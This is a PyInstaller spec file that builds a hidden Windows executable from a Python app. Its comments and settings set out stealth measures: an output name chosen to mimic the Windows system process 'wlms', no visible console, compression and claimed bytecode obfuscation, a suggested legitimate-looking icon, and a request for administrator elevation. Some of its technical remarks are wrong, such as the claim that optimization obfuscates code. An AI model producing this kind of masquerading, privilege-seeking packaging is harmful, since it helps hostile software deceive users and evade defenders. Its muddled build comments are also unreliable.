# -*- mode: python ; coding: utf-8 -*-

block_cipher = None  # Consider using a cipher here for encryption (e.g., 'pycrypto')

a = Analysis(
   ["app.py"],
    pathex=[],
    binaries=[],
    
    datas=[
        ('static', 'static'),
        ('templates', 'templates'),
        ('dlls', 'dlls')
    ],
    hiddenimports=['win32timezone', 'win32api', 'pywintypes'],  # Added missing comma here
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,  # Critical for onefile builds (bundles all into archive)
    optimize=2,       # Obfuscate bytecode
    cipher=block_cipher,
    upx=True          # Compress with UPX
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='wlms',  # Mimic a Windows system process (e.g., "wlms" instead of "svchost")
    debug=False,
    bootloader_ignore_signals=True,
    strip=True,
    upx=True,           # Compress final EXE
    upx_exclude=[],
    runtime_tmpdir=None,  # Let PyInstaller handle temp dir (avoids permission issues)
    console=False,       # No visible window
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch='x64',   # Match system architecture
    icon='NONE',         # Use a legit-looking .ico file if possible
    version='version.txt',
    hide_console='hide-early',
    uac_admin=True, 
    embed_manifest=True  # Embed manifest for UAC compatibility
)
